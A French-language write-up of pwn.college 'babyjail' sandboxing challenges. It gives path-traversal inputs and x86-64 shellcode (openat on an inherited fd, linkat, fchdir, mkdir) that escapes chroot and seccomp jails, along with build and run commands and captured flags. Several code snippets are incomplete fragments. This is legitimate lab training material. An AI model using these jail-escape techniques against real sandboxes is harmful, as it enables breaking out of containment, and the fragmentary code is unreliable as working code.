Pour avoir le premier flag dans Sandboxing on fait comme suit: babyjail_level1
../../flag : Le premier .. remonte du répertoire jail à tmp, et le second .. remonte de tmp à la racine (/). Ensuite, il accède au fichier flag situé à la racine.
babyjail_level1
/challenge/babyjail_level1 ../../flag
ensuite on obtient le premier flag
Creating a jail at `/tmp/jail-lbTd46`.
Sending the file at `../../flag` to stdout.
pwn.college{4p8plsDqGXiQVMA3MT-IPfLPdNW.0VMzIDL5MTN3UzW}

babyjail_level2
Pour bien reussir la 2 un code en assembleur s'impose:
.global _start
.intel_syntax noprefix

_start:
    # Open syscall
    lea rdi, [rip + flag]
    xor rsi, rsi
    xor rdx, rdx
    mov rax, 0x02
    syscall

    # Read syscall
    mov rdi, rax
    mov rsi, rsp
    mov rdx, 1000
    xor rax, rax
    syscall

    # Write syscall
    mov rdi, 1
    mov rax, 0x01
    syscall

    # Exit syscall
    xor rdi, rdi
    mov rax, 0x3c
    syscall

flag:
    .string "../../flag"

puis dans le terminal
gcc -nostdlib ./babyjail_level2.s -o ./babyjail_level2 ; Pour

hacker@sandboxing~level2:~$ objcopy --dump-section .text=./babyjail_level2.bin ./babyjail_level2

hacker@sandboxing~level2:~$ /challenge/babyjail_level2 / < babyjail_level2.bin 

puis on obtient le flag


babyjail_level3
Pour reussir ce challenge on commence par cette fois-ci start ça
_start:
    # Openat syscall
    mov rdi, 3                   # dirfd (3 because it was opened before chroot)
    lea rsi, [rip + flag]        # pathname (relative to dirfd)
    xor rdx, rdx                 # flags
    xor r10, r10                 # mode
    mov rax, 0x101               # syscall number for openat
    syscall

    puis on refait les mèmes manipes 
    hacker@sandboxing~level3:~$ gcc -nostdlib -o  babyjail_level3 babyjail_level3.s
hacker@sandboxing~level3:~$ objcopy --dump-section .text=babyjail_level.bin babyjail_level3
hacker@sandboxing~level3:~$ /challenge/babyjail_level3 / < babyjail_level.bin

on obtient aussitot le flag:
Executing shellcode!

pwn.college{05n7_EaErgPRM2BzYCzKW6ILyjv.01MzIDL5MTN3UzW}

babyjail_level4
Pour ce challenge on commence par un code en assembleur
_start:
    # Openat syscall
    mov rdi, 3                   # dirfd (3 because it was opened before chroot)
    lea rsi, [rip + flag]        # pathname (relative to dirfd)
    xor rdx, rdx                 # flags
    xor r10, r10                 # mode
    mov rax, 0x101               # syscall number for openat
    syscall

hacker@sandboxing~level4:~$ gcc -nostdlib -o  babyjail_level4 babyjail_level4.s           4
hacker@sandboxing~level4:~$ objcopy --dump-section .text=babyjail_level.bin babyjail_level4
hacker@sandboxing~level4:~$ /challenge/babyjail_level4 / < babyjail_level.bin
###

Restricting system calls (default: kill).

Allowing syscall: openat (number 257).
Allowing syscall: read (number 0).
Allowing syscall: write (number 1).
Allowing syscall: sendfile (number 40).
Executing shellcode!

pwn.college{gO6a972fUS5B9Ddr1mOWO0l8IvP.0FNzIDL5MTN3UzW}
Bad system call

babyjail_level5
envoie une valeur de 0 en cas de succès.

_start:
    # Open syscall to get dir_fd for '/'
    lea rdi, [rip + root_path]   # pathname for '/'
    xor rsi, rsi                 # flags (O_RDONLY)
    xor rdx, rdx                 # mode
    mov rax, 0x02                # syscall number for open
    syscall

    # Save the dir_fd
    mov r12, rax

    # Linkat syscall to create a link to 'flag'
    mov rdi, 3                   # olddirfd (3 because it was opened before chroot)
    lea rsi, [rip + old_path]    # oldpath (relative to olddirfd)
    mov rdx, r12                 # newdirfd (dir_fd for '/')
    lea r10, [rip + new_path]    # newpath (inside the jail)
    xor r8, r8                   # flags
    mov rax, 0x109               # syscall number for linkat
    syscall

hacker@sandboxing~level5:~$ gcc -nostdlib -o babyjail_level5 babyjail_level5.s
hacker@sandboxing~level5:~$ objcopy --dump-section .text=babyjail_level5.bin babyjail_level5
hacker@sandboxing~level5:~$ /challenge/babyjail_level5 / < babyjail_level5.bin

on obtient le flag

Executing shellcode!

pwn.college{o907lyktOEPLjcSImF3Fal_eJPp.0VNzIDL5MTN3UzW}

babyjail_level6

# Fchdir syscall
mov rdi, 3
mov rax, 0x51
syscall

hacker@sandboxing~level6:~$ gcc -nostdlib -o babyjail_level6 babyjail_level6.s
hacker@sandboxing~level6:~$ objcopy --dump-section .text=babyjail_level6.bin babyjail_level6
hacker@sandboxing~level6:~$ /challenge/babyjail_level6 / < babyjail_level6.bin
###

on obtient le flag 

Executing shellcode!

pwn.college{kyGrBIIafGAvtPxGfK5CIk6puTL.0lNzIDL5MTN3UzW}
Bad system call

babyjail_level7

_start:
    # Create a new directory inside the jail
    lea rdi, [rip + new_dir]
    xor rsi, rsi                # mode
    mov rax, 83                 # mkdir syscall number
    syscall


hacker@sandboxing~level7:~$ gcc -nostdlib -o babyjail_level7 babyjail_level7.s
hacker@sandboxing~level7:~$ objcopy --dump-section .text=babyjail_level7.bin babyjail_level7
hacker@sandboxing~level7:~$ /challenge/babyjail_level7 / < babyjail_level7.bin
###

on obtient le flag
Executing shellcode!

pwn.college{UNUgBngOJuRUnVm3Rut2arJ4nab.01NzIDL5MTN3UzW}
Bad system call

babyjail_level8

_start:
    # Open the flag file using openat with fd 3 (already opened to /)
    mov rdi, 3                   # dirfd (3 points to /)
    lea rsi, [rip + flag_path]   # pathname (relative to the directory referred by fd 3)
    xor rdx, rdx                 # flags (O_RDONLY)
    mov rax, 257                 # openat syscall number
    syscall


    hacker@sandboxing~level8:~$ gcc -nostdlib -o babyjail_level8 babyjail_level8.s
hacker@sandboxing~level8:~$ objcopy --dump-section .text=babyjail_level8.bin babyjail_level8
hacker@sandboxing~level8:~$ (exec 3</ /challenge/babyjail_level8 < babyjail_level8.bin) > flag.txt
Bad system call
hacker@sandboxing~level8:~$ cat flag.txt 

on obtient le flag
Executing shellcode!

pwn.college{wWpvP-zTv3EsHO3Jqv8xcdlKHC-.0FOzIDL5MTN3UzW}

babyjail_level9